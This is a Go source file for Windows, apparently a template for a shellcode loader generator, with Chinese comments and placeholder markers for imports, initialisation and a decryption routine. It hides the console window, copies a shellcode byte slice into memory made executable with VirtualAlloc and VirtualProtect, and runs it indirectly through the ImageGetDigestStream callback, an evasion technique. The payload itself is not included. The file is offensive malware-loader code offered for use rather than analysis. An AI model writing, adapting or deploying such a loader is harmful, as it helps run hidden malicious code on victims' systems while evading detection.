package main

import (
	"github.com/gonutz/ide/w32"
	"golang.org/x/sys/windows"
	"unsafe"
	//__import__
)

const (
	MEM_COMMIT                           = 0x1000
	MEM_RESERVE                          = 0x2000
	PageReadwrite                        = 0x04 // 可读写
	PageExecuteRead                      = 0x20 // 可读,可执行
	CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO = 0x04
	GENERIC_READ                         = 0x80000000
	FILE_SHARE_READ                      = 0x00000001
	OPEN_EXISTING                        = 3
	FILE_ATTRIBUTE_NORMAL                = 0x00000080
)



func closeWindows(commandShow uintptr) {
	console := w32.GetConsoleWindow()
	if console != 0 {
		_, consoleProcID := w32.GetWindowThreadProcessId(console)
		if w32.GetCurrentProcessId() == consoleProcID {
			w32.ShowWindowAsync(console, commandShow)
		}
	}
}

// 解密函数
func f() {}

func main() {
	// shellcode
	closeWindows(w32.SW_HIDE)
	//__init__

	var dummy                int
	kernel32             := windows.NewLazyDLL("kernel32.dll")
	ntdll                := windows.NewLazyDLL("ntdll.dll")
	Imagehlp             := windows.NewLazyDLL("Imagehlp.dll")
	VirtualAlloc         := kernel32.NewProc("VirtualAlloc")
	CreateFileW          := kernel32.NewProc("CreateFileW")
	CloseHandle          := kernel32.NewProc("CloseHandle")
	ImageGetDigestStream := Imagehlp.NewProc("ImageGetDigestStream")
	RtlMoveMemory        := ntdll.NewProc("RtlMoveMemory")
	VirtualProtect       := kernel32.NewProc("VirtualProtect")

	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), MEM_COMMIT|MEM_RESERVE, PageReadwrite)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
	oldProtect := PageReadwrite
	VirtualProtect.Call(addr, uintptr(len(byteSlice)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	p1, _ := windows.UTF16PtrFromString("C:\\Windows\\System32\\ntdll.dll")
	hImg, _, _ := CreateFileW.Call(uintptr(unsafe.Pointer(p1)),
		GENERIC_READ, FILE_SHARE_READ,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0)
	ImageGetDigestStream.Call(hImg, CERT_PE_IMAGE_DIGEST_ALL_IMPORT_INFO, addr, (uintptr)(unsafe.Pointer(&dummy)))
	CloseHandle.Call((uintptr)(unsafe.Pointer(&dummy)))
}
